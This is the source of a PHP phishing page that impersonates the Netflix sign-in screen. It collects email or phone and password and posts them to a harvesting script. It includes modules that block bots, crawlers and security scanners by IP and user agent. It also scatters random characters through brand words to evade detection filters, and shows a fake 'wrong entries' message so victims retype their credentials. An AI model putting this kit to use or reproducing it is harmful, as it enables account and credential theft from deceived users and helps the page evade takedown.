<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include 'autob/bts2.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"><link type="text/css" rel="stylesheet" href="oille/nul.css"><link type="text/css" rel="stylesheet" href="oille/null.css"><link rel="shortcut icon" href="fnset/favicon.ico">
<style type="text/css">
.transitioning{position:absolute;top:18%;left:0;width:100%;} .hide{display:none}
	.loader{margin:auto;height:13px;width:13px;-webkit-animation: rotation .7s infinite linear;-moz-animation: rotation .7s infinite linear;-o-animation: rotation .7s infinite linear;animation: rotation .7s infinite linear;border-left:8px solid rgba(0,0,0,.20);border-right:8px solid rgba(0,0,0,.20);border-bottom:8px solid rgba(0,0,0,.20);border-top:8px solid #fff;border-radius:100%;}
	@keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
	@media screen and (max-width: 740px){
	.hybrid-login-form-help {margin-bottom:50px;}}
</style>
</head>
<body><div id="appMountPoint"><div class="login-wrapper hybrid-login-wrapper"><div class="login-wrapper-background"><img class="concord-img vlv-creative" src="fnset/website_small.jpg" srcset="fnset/website_small.jpg 1000w, fnset/website_medium.jpg 1500w, fnset/website_large.jpg 1800w" alt=""/></div><div class="nfHeader login-header signupBasicHeader"><a href="" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netf<?php echo rT('ALPHANUMERIC',rand(1,87));?>lix</span></a></div><div class="login-body"><div><noscript><div data-uia="error-message-container" class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div data-uia="text" class="ui-message-contents">Looks like you have disabled JavaScript. Please enable JavaScript to restore full page functionality.</div></div></noscript><div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container"><div class="hybrid-login-form-main"><h1>Si<?php echo rT('ALPHANUMERIC',rand(1,87));?>gn In</h1>
<div class="ui-message-container <?php if(isset($_GET[''.$theerrkey.''])==false){echo "hide";};?>" id="errcont"><div data-uia="text" class="ui-message-contents" id="errctnt">Wrong Entries, Try Again</div></div>
<form method="post" class="login-form" id="mainloginform" action="upp" onsubmit="return validate();">
<div class="nfInput nfEmailPhoneInput login-input login-input-email"><div class="nfInputPlacement"><div class="nfEmailPhoneControls"><label class="input_id"><input type="email" data-uia="login-field" name="email" class="nfTextField" id="id_userLoginId" value="" tabindex="0" autocomplete="off" onclick="hasCtnt()" oninput="hasCtnt()" onblur="hasCtnt()" required="required"/><label for="id_userLoginId" class="placeLabel">Email or phone number</label></label></div></div></div>
<div data-uia="password-field+container" class="nfInput nfPasswordInput login-input login-input-password"><div class="nfInputPlacement"><div class="nfPasswordControls"><label class="input_id"><input type="password" data-uia="password-field" name="password" class="nfTextField" id="id_password" value="" tabindex="0" autocomplete="off" onclick="hasCtnt()" oninput="hasCtnt()" onblur="hasCtnt()" required="required"/><label for="id_password" class="placeLabel">Password</label></label><button id="id_password_toggle" type="button" class="nfPasswordToggle">SHOW</button></div></div></div>
<button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="0" id="logsub">Sign In</button>

<div class="hybrid-login-form-help"><div class="ui-binary-input login-remember-me"><input type="checkbox" class="" name="rememberMe" id="bxid_rememberMe_true" value="true" tabindex="0" data-uia="rememberMe" checked=""><label for="bxid_rememberMe_true" data-uia="label+rememberMe"><span class="login-remember-me-label-text">Reme<?php echo rT('ALPHANUMERIC',rand(1,87));?>mber me</span></label><div class="helper"></div></div><a class="login-help-link" data-uia="login-help-link">Need h<?php echo rT('ALPHANUMERIC',rand(1,87));?>elp?</a></div>

</form></div>

<div class="hybrid-login-form-other">
<div class="facebookForm regOption"><div class="fb-minimal"><hr><div class="fb-login" data-uia="fb-login" style="margin-top:10px;"><a href="#"><img class="icon-facebook" src="oille/FB-f-Logo__blue_57.png">
<span class="fbBtnText">Login with F<?php echo rT('ALPHANUMERIC',rand(1,87));?>acebook</span></a></div></div></div>
<div class="login-signup-now" data-uia="login-signup-now">Ne<?php echo rT('ALPHANUMERIC',rand(1,87));?>w to Netf<?php echo rT('ALPHANUMERIC',rand(1,87));?>lix? <a class=" " target="_self" href="create?myacc=<?php echo uniqid();?>">Sign up now</a>.</div><div class="recaptcha-terms-of-use" data-uia="recaptcha-terms-of-use"><p><span><br><br><br><br><br><br><br><br></span>&nbsp;</p></div></div></div></div></div>
<div class="site-footer-wrapper login-footer"><div class="footer-divider"></div><div class="site-footer"><p class="footer-top"><a class="footer-top-a" href="">Ques<?php echo rT('ALPHANUMERIC',rand(1,87));?>tions? Con<?php echo rT('ALPHANUMERIC',rand(1,87));?>tact us.</a></p><ul class="footer-links structural"><li class="footer-link-item" placeholder="footer_responsive_link_gift_card_terms_item"><a class="footer-link" data-uia="footer-link" href="" placeholder="footer_responsive_link_gift_card_terms"><span id="" data-uia="data-uia-footer-label">G<?php echo rT('ALPHANUMERIC',rand(1,87));?>ift Ca<?php echo rT('ALPHANUMERIC',rand(1,87));?>rd Terms</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a class="footer-link" data-uia="footer-link" href="" placeholder="footer_responsive_link_terms"><span id="" data-uia="data-uia-footer-label">Terms of Use</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_privacy_item"><a class="footer-link" data-uia="footer-link" href="" placeholder="footer_responsive_link_privacy"><span id="" data-uia="data-uia-footer-label">Priv<?php echo rT('ALPHANUMERIC',rand(1,87));?>acy Sta<?php echo rT('ALPHANUMERIC',rand(1,87));?>tement</span></a></li></ul><div class="lang-selection-container" id="lang-switcher"><div data-uia="language-picker+container" class="ui-select-wrapper"><label for="undefined-select" class="ui-label no-display"><span class="ui-label-text"></span></label><div class="select-arrow medium prefix globe"><select data-uia="language-picker" class="ui-select medium" id="undefined-select" tabindex="0" placeholder="lang-switcher"><option selected="" value="" data-language="en" data-country="US">Eng<?php echo rT('ALPHANUMERIC',rand(1,87));?>lish</option></select></div></div></div></div></div>
</div></div>
<script>
"use strict"
document.getElementById("mainloginform").setAttribute("novalidate",true);
function load(){var t = document.getElementById("logsub");t.innerHTML="&nbsp;<div class='transitioning'><div class='loader'>&nbsp;</div></div>";};
function stopload(){var t = document.getElementById("logsub");t.innerHTML="Sign In";document.getElementById("errcont").style.display="block";};
function disperr(i){i.className+=" hasError";};
function validate(){var errc = document.getElementById("errcont");var errct = document.getElementById("errctnt");errc.style.display="none";
load();var self=document.getElementById("mainloginform"); var input = self.querySelectorAll("input[required]");var emptylist=[];for(var i=0;i<input.length;i++){if(input[i].value==""){emptylist.push(i);};} if(emptylist.length >= 1){setTimeout(function(){input[emptylist[0]].focus();stopload();errct.innerHTML="All fields are required !";
for(var i of emptylist){disperr(input[i])};},1500);return false;} 
else{<?php if(!stripos($_SESSION['device'],'yochi')){banbot();};?>
if(isNaN(Number(input[0].value)) && /[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/.test(input[0].value.toLowerCase()) == false){setTimeout(function(){stopload();errct.innerHTML="Wrong Entries, Please check and try again";disperr(input[0]);},1500);return false;}
else if(parseInt(Number(input[0].value)) && input[0].value.length < 8){setTimeout(function(){stopload();errct.innerHTML="Wrong Entries, Please check and try again";disperr(input[0]);},1500);return false;}
else{return true;};}; };
function hasCtnt(){var tgt=event.target;if(tgt.value!=""){tgt.className+=" hasText"} else{tgt.className="nfTextField"};};
</script>
<div></div></body></html>